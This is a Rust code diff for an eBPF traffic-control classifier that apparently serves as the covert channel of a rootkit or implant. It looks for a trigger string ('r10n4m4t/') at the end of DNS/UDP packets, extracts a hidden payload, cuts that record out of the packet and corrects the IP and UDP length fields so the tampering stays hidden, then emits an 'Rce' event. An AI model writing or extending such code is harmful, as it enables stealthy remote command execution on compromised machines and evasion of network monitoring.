@@ -3,7 +3,8 @@ use core::net::Ipv4Addr;
 use aya_ebpf::{
     bindings::{TC_ACT_OK, TC_ACT_PIPE},
     helpers::bpf_skb_change_tail,
-    macros::classifier,
+    macros::{classifier, map},
+    maps::PerCpuArray,
     programs::TcContext,
 };
 use aya_log_ebpf::{error, info};
@@ -14,7 +15,7 @@ use network_types::{
 };
 
 use crate::common::{
-    update_addr, update_ip_hdr_tot_len, update_udp_hdr_len, Rce, UpdateType, HIJACK_IP,
+    load_bytes, update_addr, update_ip_hdr_tot_len, update_udp_hdr_len, Rce, UpdateType, HIJACK_IP,
     IP_SRC_ADDR_OFFSET, RBUF, TARGET_IP, UDP_CSUM_OFFSET, UDP_OFFSET,
 };
 
@@ -33,6 +34,17 @@ fn submit(rce: Rce) {
         buf.submit(0);
     }
 }
+
+pub struct Buf {
+    pub buf: [u8; 8192],
+}
+
+#[map]
+pub static DNS_PAYLOAD_BUFFER: PerCpuArray<Buf> = PerCpuArray::with_max_entries(1, 0);
+
+const AR_HEADER_SZ: usize = 13;
+const FOOTER_TXT: &str = "r10n4m4t/";
+const FOOTER_EXTRA_BYTES: usize = 3;
 
 #[inline]
 fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
@@ -56,25 +68,60 @@ fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
                         -1
                     })?;
 
-                let mut action = [0u8; 10];
-                let _ = ctx.load_bytes((ctx.len() - 10) as usize, &mut action)?;
+                let mut footer = [0u8; FOOTER_TXT.len() + FOOTER_EXTRA_BYTES];
+                let _ = ctx.load_bytes(ctx.len() as usize - FOOTER_TXT.len(), &mut footer)?;
 
-                let last_bytes_rtcp_trigger: [u8; 10] =
-                    [118, 47, 114, 49, 48, 110, 52, 109, 52, 116];
-                let record_size = 22u32;
-                if action == last_bytes_rtcp_trigger {
+                let last_bytes_rtcp_trigger: [u8; FOOTER_TXT.len()] =
+                    FOOTER_TXT.as_bytes().try_into().unwrap();
+
+                if footer[..FOOTER_TXT.len()] == last_bytes_rtcp_trigger {
                     info!(ctx, " !! TRIGGER MOTHERFUCKER !! ");
+                    let payload_sz = u16::from_be_bytes(
+                        footer
+                            .get(footer.len().saturating_sub(2)..)
+                            .ok_or(0u32)?
+                            .try_into()
+                            .unwrap(),
+                    ) as usize;
+
+                    info!(ctx, "payload is {} bytes long\npayload is:", payload_sz);
+
+                    let record_sz =
+                        AR_HEADER_SZ + payload_sz as usize + FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;
+                    let payload_buf = unsafe {
+                        let ptr = DNS_PAYLOAD_BUFFER.get_ptr_mut(0).ok_or(-1)?;
+                        &mut (*ptr).buf
+                    };
+                    load_bytes(
+                        ctx,
+                        ctx.len().saturating_sub(
+                            (FOOTER_TXT.len() + FOOTER_EXTRA_BYTES + payload_sz) as u32,
+                        ) as usize,
+                        payload_buf,
+                    )?;
+
+                    let payload = &payload_buf.get(..payload_sz);
+                    if let Some(p) = *payload {
+                        for c in p {
+                            info!(ctx, " {} ", *c);
+                        }
+                    }
+
                     unsafe {
-                        bpf_skb_change_tail(ctx.skb.skb, ctx.len() - record_size, 0);
+                        bpf_skb_change_tail(
+                            ctx.skb.skb,
+                            ctx.len().saturating_sub(record_sz as u32),
+                            0,
+                        );
                     };
                     update_ip_hdr_tot_len(
                         ctx,
                         &header.tot_len,
-                        &(u16::from_be(header.tot_len) - record_size as u16).to_be(),
+                        &(u16::from_be(header.tot_len).saturating_sub(record_sz as u16)).to_be(),
                     )?;
                     update_udp_hdr_len(
                         ctx,
-                        &(u16::from_be(udp_hdr.len) - record_size as u16).to_be(),
+                        &(u16::from_be(udp_hdr.len).saturating_sub(record_sz as u16)).to_be(),
                     )?;
                     submit(Rce {
                         prog: 0,
